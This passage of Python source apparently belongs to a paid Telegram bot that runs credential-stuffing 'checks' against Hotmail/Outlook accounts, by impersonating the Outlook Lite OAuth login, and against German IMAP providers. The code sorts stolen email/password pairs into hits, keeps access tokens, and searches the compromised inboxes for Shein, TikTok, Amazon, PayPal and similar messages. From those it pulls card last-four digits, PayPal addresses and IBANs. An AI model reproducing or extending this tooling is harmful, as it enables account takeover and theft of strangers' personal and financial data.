    markup = types.InlineKeyboardMarkup(row_width=2)

    btn1 = types.InlineKeyboardButton("⏱ 1 Hour", callback_data="vip_duration_1h")
    btn2 = types.InlineKeyboardButton("📅 1 Day", callback_data="vip_duration_1d")
    btn3 = types.InlineKeyboardButton("📆 1 Week", callback_data="vip_duration_1w")
    btn4 = types.InlineKeyboardButton("🗓 1 Month", callback_data="vip_duration_1m")
    btn5 = types.InlineKeyboardButton("♾️ Forever", callback_data="vip_duration_forever")
    btn_back = types.InlineKeyboardButton("◀️ Cancel", callback_data="admin_panel")

    markup.add(btn1, btn2, btn3, btn4, btn5, btn_back)
    return markup

# Stop Button for Progress Message
def stop_scan_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    btn_stop = types.InlineKeyboardButton("⏹ Stop Scan", callback_data=f"stop_scan_{user_id}")
    markup.add(btn_stop)
    return markup

# =====================================================
# HOTMAIL CHECKER ENGINE
# =====================================================

class HotmailChecker:
    """Real Hotmail/Outlook Checker"""

    @staticmethod
    def check_account(email, password):
        """Check if account is valid"""
        try:
            session = requests.Session()

            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)",
            }

            r1 = session.get(url1, headers=headers1, timeout=6)

            if "MSAccount" not in r1.text:
                return {"status": "BAD"}

            params = {
                "client_info": "1",
                "haschrome": "1",
                "login_hint": email,
                "mkt": "en",
                "response_type": "code",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
            }

            url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
            r2 = session.get(url_auth, timeout=10)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            login_data = {
                "i13": "1",
                "login": email,
                "loginfmt": email,
                "type": "11",
                "LoginOptions": "1",
                "passwd": password,
                "ps": "2",
                "PPFT": ppft,
                "PPSX": "PassportR",
                "i19": "9960"
            }

            r3 = session.post(post_url, data=login_data, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0"
            }, allow_redirects=False, timeout=6)

            if "password is incorrect" in r3.text.lower() or "sErrTxt" in r3.text or "incorrect" in r3.text.lower():
                return {"status": "BAD"}

            location = r3.headers.get("Location", "")
            if not location or "code=" not in location:
                return {"status": "BAD"}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}

            code = code_match.group(1)

            token_data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }

            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                            data=token_data, timeout=6)

            if "access_token" not in r4.text:
                return {"status": "BAD"}

            token_json = r4.json()
            access_token = token_json["access_token"]

            mspcid = None
            for cookie in session.cookies:
                if cookie.name == "MSPCID":
                    mspcid = cookie.value.upper()
                    break

            if not mspcid:
                mspcid = str(uuid.uuid4()).upper()

            return {
                "status": "HIT",
                "token": access_token,
                "cid": mspcid
            }

        except:
            return {"status": "RETRY"}

    @staticmethod
    def check_services(email, password, token, cid, services_dict):
        """Check for linked services - parallel execution"""
        found_services = []
        found_lock = threading.Lock()

        search_url = "https://outlook.live.com/search/api/v2/query"
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com"
        }

        def check_one_service(service_name, sender_email):
            try:
                payload = {
                    "Cvid": str(uuid.uuid4()),
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "UTC",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                        "From": 0,
                        "Query": {"QueryString": f"from:{sender_email}"},
                        "Size": 1,
                        "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                    }]
                }
                r = requests.post(search_url, json=payload, headers=headers, timeout=5)
                if r.status_code == 200:
                    data = r.json()
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    if result_set.get('Total', 0) > 0:
                                        with found_lock:
                                            found_services.append(service_name)
                                        return
            except:
                pass

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                futures = [
                    executor.submit(check_one_service, name, email_addr)
                    for name, email_addr in services_dict.items()
                ]
                concurrent.futures.wait(futures, timeout=15)
        except:
            pass

        return found_services

    @staticmethod
    def check_shein_payment(email, password, token, cid):
        """Check Shein payment methods by searching inbox for order/payment emails"""
        payment_info = {"methods": [], "raw": "No Payment Method"}
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }

            for query_str in ["from:noreply@sheinnotice.com payment", "from:noreply@sheinnotice.com order confirmation", "from:noreply@shein.com"]:
                payload = {
                    "Cvid": str(uuid.uuid4()),
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "UTC",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Message",
                        "ContentSources": ["Exchange"],
                        "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                        "From": 0,
                        "Query": {"QueryString": query_str},
                        "Size": 5,
                        "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                    }]
                }

                r = requests.post(search_url, json=payload, headers=headers, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    results = result_set.get('Results', [])
                                    for result in results:
                                        preview = result.get('Preview', '') or ''
                                        subject = result.get('Subject', '') or ''
                                        body_text = (preview + " " + subject).lower()

                                        import re as _re
                                        visa_match = _re.search(r'visa[^\d]*(\d{4})', body_text)
                                        mc_match = _re.search(r'mastercard[^\d]*(\d{4})', body_text)
                                        amex_match = _re.search(r'amex[^\d]*(\d{4})', body_text)
                                        card_match = _re.search(r'card[^\d]*(?:ending|last\s*4)[^\d]*(\d{4})', body_text)
                                        generic_card = _re.search(r'(?:credit|debit)\s*card[^\d]*(\d{4})', body_text)
                                        last4_match = _re.search(r'\*{4,}\s*(\d{4})', body_text) or _re.search(r'x{4,}(\d{4})', body_text)
                                        paypal_match = 'paypal' in body_text
                                        paypal_email_match = _re.search(r'paypal[^@]*?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', body_text)
                                        klarna_match = 'klarna' in body_text
                                        applepay_match = 'apple pay' in body_text
                                        googlepay_match = 'google pay' in body_text
                                        afterpay_match = 'afterpay' in body_text or 'clearpay' in body_text

                                        if visa_match and f"Visa ****{visa_match.group(1)}" not in payment_info["methods"]:
                                            payment_info["methods"].append(f"Visa ****{visa_match.group(1)}")
                                        if mc_match and f"Mastercard ****{mc_match.group(1)}" not in payment_info["methods"]:
                                            payment_info["methods"].append(f"Mastercard ****{mc_match.group(1)}")
                                        if amex_match and f"Amex ****{amex_match.group(1)}" not in payment_info["methods"]:
                                            payment_info["methods"].append(f"Amex ****{amex_match.group(1)}")
                                        if card_match and f"Card ****{card_match.group(1)}" not in payment_info["methods"]:
                                            payment_info["methods"].append(f"Card ****{card_match.group(1)}")
                                        if generic_card and f"Card ****{generic_card.group(1)}" not in payment_info["methods"]:
                                            payment_info["methods"].append(f"Card ****{generic_card.group(1)}")
                                        if last4_match and not (visa_match or mc_match or amex_match or card_match or generic_card):
                                            entry = f"Card ****{last4_match.group(1)}"
                                            if entry not in payment_info["methods"]:
                                                payment_info["methods"].append(entry)

                                        if paypal_match and not any("PayPal" in m for m in payment_info["methods"]):
                                            if paypal_email_match:
                                                payment_info["methods"].append(f"PayPal ({paypal_email_match.group(1)})")
                                            else:
                                                payment_info["methods"].append("PayPal")

                                        if klarna_match and "Klarna" not in payment_info["methods"]:
                                            payment_info["methods"].append("Klarna")
                                        if applepay_match and "Apple Pay" not in payment_info["methods"]:
                                            payment_info["methods"].append("Apple Pay")
                                        if googlepay_match and "Google Pay" not in payment_info["methods"]:
                                            payment_info["methods"].append("Google Pay")
                                        if afterpay_match and "Afterpay/Clearpay" not in payment_info["methods"]:
                                            payment_info["methods"].append("Afterpay/Clearpay")

            if payment_info["methods"]:
                payment_info["raw"] = " | ".join(payment_info["methods"])

        except Exception as e:
            print(f"[Shein Payment Check] Error: {e}")

        return payment_info

    @staticmethod
    def check_tiktok_full(email, password, token, cid):
        """TikTok Full Capture - Extract COMPLETE TikTok data"""
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"

            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }

            # Search for TikTok emails
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Message",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": "tiktok"},
                    "Size": 25,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }

            r = requests.post(search_url, json=payload, headers=headers, timeout=15)

            if r.status_code != 200:
                return None

            search_text = r.text

            # Count TikTok emails
            tiktok_senders = [
                "no-reply@shop.tiktok.com",
                "notification@service.tiktok.com",
                "noreply@account.tiktok.com",
                "register@account.tiktok.com",
                "no-reply@tiktok.com",
            ]

            tiktok_count = 0
            for sender in tiktok_senders:
                tiktok_count += search_text.count(sender)

            if tiktok_count == 0:
                return None

            # Extract username from emails
            username_patterns = [
                r'(?i)this\s+email\s+was\s+generated\s+for\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'(?i)Hi\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'(?i)Hello\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'@([a-zA-Z0-9_\.]{2,30})',
            ]

            username = None
            for pattern in username_patterns:
                match = re.search(pattern, search_text)
                if match:
                    potential_username = match.group(1)
                    if not any(x in potential_username.lower() for x in ['tiktok', 'mail', 'email', 'hotmail', 'outlook']):
                        username = potential_username
                        break

            if not username:
                return {
                    "has_tiktok": True,
                    "tiktok_emails": tiktok_count,
                    "username": "Unknown",
                    "followers": 0,
                    "following": 0,
                    "videos": 0,
                    "likes": 0,
                    "verified": False
                }

            # Fetch TikTok profile data
            profile_data = {
                "has_tiktok": True,
                "tiktok_emails": tiktok_count,
                "username": username,
                "followers": 0,
                "following": 0,
                "videos": 0,
                "likes": 0,
                "verified": False
            }

            # Method 1: TikTok API endpoint (most reliable for stats)
            try:
                api_url = f"https://www.tiktok.com/api/user/detail/?uniqueId={username}&secUid="
                api_headers = {
                    'user-agent': random.choice(USER_AGENTS_TIKTOK),
                    'accept': 'application/json, text/plain, */*',
                    'referer': f'https://www.tiktok.com/@{username}',
                    'accept-language': 'en-US,en;q=0.9',
                }
                api_resp = requests.get(api_url, headers=api_headers, timeout=10)
                if api_resp.status_code == 200:
                    api_data = api_resp.json()
                    user_info = api_data.get('userInfo', {})
                    stats = user_info.get('stats', {})
                    usr = user_info.get('user', {})

                    if stats.get('followerCount', 0) > 0 or stats.get('videoCount', 0) > 0:
                        profile_data['followers'] = stats.get('followerCount', 0)
                        profile_data['following'] = stats.get('followingCount', 0)
                        profile_data['likes'] = stats.get('heartCount', 0)
                        profile_data['videos'] = stats.get('videoCount', 0)
                        profile_data['verified'] = usr.get('verified', False)
                        return profile_data
            except Exception as e:
                print(f"[TikTok] API method failed for {username}: {e}")

            # Method 2: Scrape HTML page as fallback
            try:
                headers_tiktok = {
                    'user-agent': random.choice(USER_AGENTS_TIKTOK),
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.9',
                    'referer': 'https://www.tiktok.com/',
                }

                url = f"https://www.tiktok.com/@{username}"
                response = requests.get(url, headers=headers_tiktok, timeout=10, allow_redirects=True)

                if response.status_code == 200:
                    html = response.text

                    # Try SIGI_STATE JSON extraction
                    for script_id in ['__UNIVERSAL_DATA_FOR_REHYDRATION__', 'SIGI_STATE', '__NEXT_DATA__']:
                        json_pattern = rf'<script id="{script_id}"[^>]*>(.*?)</script>'
                        json_match = re.search(json_pattern, html, re.DOTALL)
                        if json_match:
                            try:
                                data = json.loads(json_match.group(1))

                                user_detail = None
                                if script_id == '__UNIVERSAL_DATA_FOR_REHYDRATION__':
                                    user_detail = data.get('__DEFAULT_SCOPE__', {}).get('webapp.user-detail', {}).get('userInfo', {})
                                elif script_id == 'SIGI_STATE':
                                    user_module = data.get('UserModule', {})
                                    users_data = user_module.get('users', {})
                                    stats_data = user_module.get('stats', {})
                                    if username in users_data:
                                        user_detail = {
                                            'user': users_data[username],
                                            'stats': stats_data.get(username, {})
                                        }

                                if user_detail:
                                    usr = user_detail.get('user', {})
                                    stats = user_detail.get('stats', {})
                                    fc = stats.get('followerCount', 0)
                                    if fc > 0:
                                        profile_data['followers'] = fc
                                        profile_data['following'] = stats.get('followingCount', 0)
                                        profile_data['likes'] = stats.get('heartCount', 0)
                                        profile_data['videos'] = stats.get('videoCount', 0)
                                        profile_data['verified'] = usr.get('verified', False)
                                        return profile_data
                            except Exception:
                                pass

                    # Fallback: Regex extraction from raw HTML
                    followers_match = re.search(r'"followerCount":(\d+)', html)
                    if followers_match:
                        profile_data['followers'] = int(followers_match.group(1))
                    following_match = re.search(r'"followingCount":(\d+)', html)
                    if following_match:
                        profile_data['following'] = int(following_match.group(1))
                    videos_match = re.search(r'"videoCount":(\d+)', html)
                    if videos_match:
                        profile_data['videos'] = int(videos_match.group(1))
                    likes_match = re.search(r'"heartCount":(\d+)', html)
                    if likes_match:
                        profile_data['likes'] = int(likes_match.group(1))
                    verified_match = re.search(r'"verified":(true|false)', html)
                    if verified_match:
                        profile_data['verified'] = verified_match.group(1) == 'true'

                    return profile_data
            except Exception as e:
                print(f"[TikTok] HTML scrape failed for {username}: {e}")

            # Return basic data if profile fetch fails
            return {
                "has_tiktok": True,
                "tiktok_emails": tiktok_count,
                "username": username,
                "followers": 0,
                "following": 0,
                "videos": 0,
                "likes": 0,
                "verified": False
            }

        except:
            return None


IMAP_DOMAINS = {
    "t-online.de": "imap.t-online.de",
    "freenet.de": "imap.freenet.de",
    "online.de": "imap.online.de",
}


class TOnlineChecker:
    """Generic IMAP Checker for t-online.de, freenet.de, online.de"""

    IMAP_PORT = 993
    IMAP_TIMEOUT = 8

    @staticmethod
    def _connect(imap_host="imap.t-online.de"):
        """Create IMAP connection with timeout"""
        import socket
        old_timeout = socket.getdefaulttimeout()
        socket.setdefaulttimeout(TOnlineChecker.IMAP_TIMEOUT)
        try:
            mail = imaplib.IMAP4_SSL(imap_host, TOnlineChecker.IMAP_PORT)
            if hasattr(mail, 'sock') and mail.sock:
                mail.sock.settimeout(TOnlineChecker.IMAP_TIMEOUT)
            return mail
        finally:
            socket.setdefaulttimeout(old_timeout)

    @staticmethod
    def _safe_close(mail):
        if mail:
            try:
                mail.logout()
            except Exception:
                try:
                    mail.shutdown()
                except Exception:
                    pass

    @staticmethod
    def _get_imap_host(email_addr):
        domain = email_addr.lower().split("@")[-1] if "@" in email_addr else ""
        return IMAP_DOMAINS.get(domain, "imap.t-online.de")

    @staticmethod
    def check_account(email, password):
        mail = None
        try:
            imap_host = TOnlineChecker._get_imap_host(email)
            mail = TOnlineChecker._connect(imap_host)
            mail.login(email, password)
            return {"status": "HIT", "imap": True}
        except imaplib.IMAP4.error:
            return {"status": "BAD"}
        except Exception:
            return {"status": "RETRY"}
        finally:
            TOnlineChecker._safe_close(mail)

    @staticmethod
    def search_inbox(email, password, sender_query):
        results = []
        mail = None
        try:
            imap_host = TOnlineChecker._get_imap_host(email)
            mail = TOnlineChecker._connect(imap_host)
            mail.login(email, password)
            for folder in ["INBOX", "Spam"]:
                try:
                    status, _ = mail.select(folder)
                    if status != "OK":
                        continue
                    _, data = mail.search(None, f'FROM "{sender_query}"')
                    if data and data[0]:
                        ids = data[0].split()
                        results.extend(ids)
                except Exception:
                    pass
        except Exception:
            pass
        finally:
            TOnlineChecker._safe_close(mail)
        return results

    @staticmethod
    def search_and_fetch(email, password, sender_query, max_count=5):
        """Search AND fetch in one IMAP connection (fast)"""
        fetched = []
        found = False
        mail = None
        try:
            imap_host = TOnlineChecker._get_imap_host(email)
            mail = TOnlineChecker._connect(imap_host)
            mail.login(email, password)
            for folder in ["INBOX", "Spam"]:
                try:
                    status, _ = mail.select(folder)
                    if status != "OK":
                        continue
                    _, data = mail.search(None, f'FROM "{sender_query}"')
                    if not data or not data[0]:
                        continue
                    found = True
                    ids = data[0].split()[-max_count:]
                    for msg_id in ids:
                        try:
                            _, msg_data = mail.fetch(msg_id, "(RFC822)")
                            if msg_data and msg_data[0]:
                                raw = msg_data[0][1]
                                msg = email_lib.message_from_bytes(raw)
                                subject = ""
                                subj_raw = msg.get("Subject", "")
                                if subj_raw:
                                    decoded_parts = decode_header(subj_raw)
                                    for part, enc in decoded_parts:
                                        if isinstance(part, bytes):
                                            subject += part.decode(enc or "utf-8", errors="ignore")
                                        else:
                                            subject += part
                                body = ""
                                if msg.is_multipart():
                                    for part in msg.walk():
                                        if part.get_content_type() == "text/plain":
                                            try:
                                                body += part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                            except Exception:
                                                pass
                                else:
                                    try:
                                        body = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                                    except Exception:
                                        pass
                                fetched.append({"subject": subject, "body": body})
                        except Exception:
                            pass
                except Exception:
                    pass
        except Exception:
            pass
        finally:
            TOnlineChecker._safe_close(mail)
        return found, fetched

    @staticmethod
    def fetch_emails_from(email, password, sender_email, max_count=5):
        """Fetch email bodies from a specific sender on t-online"""
        _, fetched = TOnlineChecker.search_and_fetch(email, password, sender_email, max_count)
        return fetched


def check_account_auto(email, password):
    """Auto-detect email provider and use correct checker"""
    domain = email.lower().split("@")[-1] if "@" in email else ""
    if domain in IMAP_DOMAINS:
        return TOnlineChecker.check_account(email, password), "tonline"
    else:
        return HotmailChecker.check_account(email, password), "hotmail"


def extract_payment_from_text(text):
    """Extract payment methods from email text - comprehensive DE/EN"""
    methods = []
    text_lower = text.lower() if text else ""
    text_orig = text or ""

    visa_match = re.search(r'visa[^\d]{0,15}(\d{4})', text_lower)
    mc_match = re.search(r'(?:mastercard|master\s*card)[^\d]{0,15}(\d{4})', text_lower)
    amex_match = re.search(r'(?:amex|american\s*express)[^\d]{0,15}(\d{4})', text_lower)
    maestro_match = re.search(r'maestro[^\d]{0,15}(\d{4})', text_lower)
    diners_match = re.search(r'diners[^\d]{0,15}(\d{4})', text_lower)
    discover_match = re.search(r'discover[^\d]{0,15}(\d{4})', text_lower)

    card_ending = re.search(r'(?:card|karte)[^\d]*(?:ending|endet|last\s*4|letzte)[^\d]*(\d{4})', text_lower)
    generic_card = re.search(r'(?:credit|debit|kredit|giro|ec)[\-\s]*(?:card|karte)[^\d]{0,15}(\d{4})', text_lower)
    last4_match = re.search(r'\*{3,}\s*(\d{4})', text_lower) or re.search(r'x{3,}\s*(\d{4})', text_lower)
    masked_card = re.search(r'(\d{4}[\s\-]*\*{4,}[\s\-]*\*{4,}[\s\-]*\d{4})', text_lower)

    iban_match = re.search(r'(DE\d{2}\s*\d{4}\s*\d{4}\s*\d{4}\s*\d{4}\s*\d{2})', text_orig, re.IGNORECASE)
    iban_masked = re.search(r'(DE\d{2}[\s]*[*xX]{4,}[\s]*\d{4})', text_orig, re.IGNORECASE)

    has_named_card = False

    if visa_match:
        methods.append(f"💳 Visa ****{visa_match.group(1)}")
        has_named_card = True
    if mc_match:
        methods.append(f"💳 Mastercard ****{mc_match.group(1)}")
        has_named_card = True
    if amex_match:
        methods.append(f"💳 Amex ****{amex_match.group(1)}")
        has_named_card = True
    if maestro_match:
        methods.append(f"💳 Maestro ****{maestro_match.group(1)}")
        has_named_card = True
    if diners_match:
        methods.append(f"💳 Diners ****{diners_match.group(1)}")
        has_named_card = True
    if discover_match:
        methods.append(f"💳 Discover ****{discover_match.group(1)}")
        has_named_card = True
    if card_ending and not has_named_card:
        methods.append(f"💳 Karte ****{card_ending.group(1)}")
        has_named_card = True
    if generic_card and not has_named_card:
        methods.append(f"💳 Karte ****{generic_card.group(1)}")
        has_named_card = True
    if masked_card and not has_named_card:
        methods.append(f"💳 Karte {masked_card.group(1)}")
        has_named_card = True
    if last4_match and not has_named_card:
        methods.append(f"💳 Karte ****{last4_match.group(1)}")

    if 'paypal' in text_lower:
        pp_email = re.search(r'paypal[^@]*?([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})', text_lower)
        if pp_email:
            methods.append(f"PayPal ({pp_email.group(1)})")
        else:
            methods.append("PayPal")
    if 'klarna' in text_lower:
        if 'sofort' in text_lower or 'klarna sofort' in text_lower:
            methods.append("Klarna Sofort")
        elif re.search(r'klarna.*rechnungskauf|rechnungskauf.*klarna|klarna.*rechnung|rechnung.*klarna', text_lower):
            methods.append("Klarna Rechnung")
        elif re.search(r'klarna.*rat|rat.*klarna', text_lower):
            methods.append("Klarna Ratenzahlung")
        else:
            methods.append("Klarna")
    if 'apple pay' in text_lower or 'applepay' in text_lower:
        methods.append("Apple Pay")
    if 'google pay' in text_lower or 'googlepay' in text_lower or 'g pay' in text_lower:
        methods.append("Google Pay")
    if 'samsung pay' in text_lower:
        methods.append("Samsung Pay")

    if re.search(r'(?:sepa|lastschrift|einzug|bankeinzug|direct\s*debit|abbuchung)', text_lower):
        if iban_match:
            iban_val = iban_match.group(1).replace(" ", "")
            methods.append(f"Lastschrift (IBAN: {iban_val[:6]}****{iban_val[-4:]})")
        elif iban_masked:
            methods.append(f"Lastschrift (IBAN: {iban_masked.group(1)})")
        else:
            methods.append("SEPA-Lastschrift")
    elif iban_match and not any('Lastschrift' in m or 'IBAN' in m for m in methods):
        iban_val = iban_match.group(1).replace(" ", "")
        methods.append(f"Bankverbindung (IBAN: {iban_val[:6]}****{iban_val[-4:]})")
    elif iban_masked and not any('IBAN' in m for m in methods):
        methods.append(f"Bankverbindung (IBAN: {iban_masked.group(1)})")

    if re.search(r'(?:auf rechnung|kauf auf rechnung|rechnungskauf|per rechnung|invoice|pay later|zahlung per rechnung)', text_lower) and 'klarna' not in text_lower:
        methods.append("Kauf auf Rechnung")
    if re.search(r'(?:ratenzahlung|ratenkauf|in raten|monatliche rate|finanzierung|installment)', text_lower) and 'klarna' not in text_lower:
        methods.append("Ratenzahlung")
    if re.search(r'(?:nachnahme|cash on delivery|bei lieferung|an der t.r)', text_lower):
        methods.append("Nachnahme")
    if re.search(r'(?:vorkasse|vorab.berweisung|bank.?transfer|wire transfer|prepayment)', text_lower):
        methods.append("Vorkasse/Überweisung")
    if re.search(r'(?:sofort.berweisung|sofort banking|sofortüberweisung)', text_lower) and 'klarna' not in text_lower:
        methods.append("Sofortüberweisung")
    if re.search(r'(?:giropay)', text_lower):
        methods.append("Giropay")
    if re.search(r'(?:eps[\s\-])', text_lower):
        methods.append("EPS")
    if re.search(r'(?:ideal|i\s*deal)', text_lower):
        methods.append("iDEAL")
    if re.search(r'gutschein|gift\s*card|voucher|guthaben', text_lower):
        gc_val = re.search(r'(?:gutschein|gift\s*card|voucher|guthaben)[^\d]{0,15}(\d+[.,]\d{2})', text_lower)
        if gc_val:
            methods.append(f"Gutschein ({gc_val.group(1)}€)")
        else:
            methods.append("Gutschein/Guthaben")

    amount_match = re.search(r'(?:gesamt|total|summe|betrag|amount|zu zahlen|gesamtbetrag|endbetrag)[:\s]*(\d+[.,]\d{2})\s*(?:€|eur|euro)?', text_lower)
    if amount_match:
        amt = amount_match.group(1)
        methods.append(f"Betrag: {amt}€")

    return list(dict.fromkeys(methods))


def extract_ryd_data(email_texts):
    """Extract RYD order and payment info from email bodies"""
    orders = []
    payments = []
    for item in email_texts:
        combined = (item.get("subject", "") + " " + item.get("body", ""))
        combined_lower = combined.lower()

        order_match = re.search(r'(?:order|bestellung|booking|buchung)[^\w]*([A-Z0-9\-]{4,20})', combined, re.IGNORECASE)
        if order_match:
            order_num = order_match.group(1)
            if order_num not in orders:
                orders.append(order_num)

        found_payments = extract_payment_from_text(combined_lower)
        for p in found_payments:
            if p not in payments:
                payments.append(p)

    return orders, payments


def _inbox_search_hotmail(token, cid, query_str):
    search_url = "https://outlook.live.com/search/api/v2/query"
    headers = {
        "User-Agent": "Outlook-Android/2.0",
        "Accept": "application/json",
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{cid}"
    }
    payload = {
        "Cvid": str(uuid.uuid4()),
        "Scenario": {"Name": "owa.react"},
        "TimeZone": "UTC",
        "TextDecorations": "Off",
        "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": query_str},
            "Size": 1,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
        }]
    }
    try:
        r = requests.post(search_url, json=payload, headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            for entity_set in data.get('EntitySets', []):
                for result_set in entity_set.get('ResultSets', []):
                    if result_set.get('Total', 0) > 0:
                        return True
    except Exception:
        pass
    return False


def _hotmail_search_and_fetch(token, cid, query_str, size=5):
    search_url = "https://outlook.live.com/search/api/v2/query"
    headers = {
        "User-Agent": "Outlook-Android/2.0",
        "Accept": "application/json",
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{cid}"
    }
    payload = {
        "Cvid": str(uuid.uuid4()),
        "Scenario": {"Name": "owa.react"},
        "TimeZone": "UTC",
        "TextDecorations": "Off",
        "EntityRequests": [{
            "EntityType": "Message",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": query_str},
            "Size": size,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
        }]
    }
    try:
        r = requests.post(search_url, json=payload, headers=headers, timeout=8)
        if r.status_code == 200:
            data = r.json()
            results = []
            for entity_set in data.get('EntitySets', []):
                for result_set in entity_set.get('ResultSets', []):
                    for res in result_set.get('Results', []):
                        results.append({
                            "subject": res.get("Subject", ""),
                            "body": res.get("Preview", "")
                        })
            return results
    except Exception:
        pass
    return []


INBOX_SERVICES = {
    "amazon": {
        "name": "Amazon",
        "emoji": "📦",
        "mode": "inbox_amazon",
        "tonline_senders": ["auto-confirm@amazon.de", "shipment-tracking@amazon.de", "noreply@amazon.de", "auto-confirm@amazon.com"],
        "hotmail_queries": ['from:"auto-confirm@amazon.de"', 'from:"shipment-tracking@amazon.de"', 'from:"noreply@amazon.de"', 'from:"auto-confirm@amazon.com"'],
        "order_regex": r'(?:Bestellnummer|order|Bestell-Nr|Order\s*#)[^\w]*([A-Z0-9\-]{5,25})',
    },
    "paypal": {
        "name": "PayPal",
        "emoji": "💰",
        "mode": "inbox_paypal",
        "tonline_senders": ["service@paypal.de", "service@paypal.com", "paypal@mail.paypal.de"],
        "hotmail_queries": ['from:"service@paypal.de"', 'from:"service@paypal.com"', 'from:"paypal@mail.paypal.de"'],
        "order_regex": r'(?:Transaktionscode|Transaction\s*ID|Transaktions-ID)[^\w]*([A-Z0-9\-]{8,30})',
    },
    "uber": {
        "name": "Uber",
        "emoji": "🚕",
        "mode": "inbox_uber",
        "tonline_senders": ["noreply@uber.com", "uber@uber.com"],
        "hotmail_queries": ['from:"noreply@uber.com"', 'from:"uber@uber.com"'],
        "order_regex": r'(?:trip|fahrt|ride|receipt)[^\w]*([A-Z0-9\-]{5,25})',
    },
    "lieferando": {
        "name": "Lieferando",
        "emoji": "🍕",
        "mode": "inbox_lieferando",
        "tonline_senders": ["noreply@lieferando.de", "info@lieferando.de", "no-reply@connect.lieferando.de", "no-reply@lieferando.de"],
        "hotmail_queries": ['from:"noreply@lieferando.de"', 'from:"info@lieferando.de"', 'from:"no-reply@connect.lieferando.de"', 'from:"no-reply@lieferando.de"'],
        "order_regex": r'(?:Bestellnummer|order|Bestell-Nr)[^\w]*([A-Z0-9\-]{4,20})',
    },
    "booking": {
        "name": "Booking.com",
        "emoji": "✈️",
        "mode": "inbox_booking",
        "tonline_senders": ["noreply@booking.com", "customer.service@booking.com"],
        "hotmail_queries": ['from:"noreply@booking.com"', 'from:"customer.service@booking.com"'],
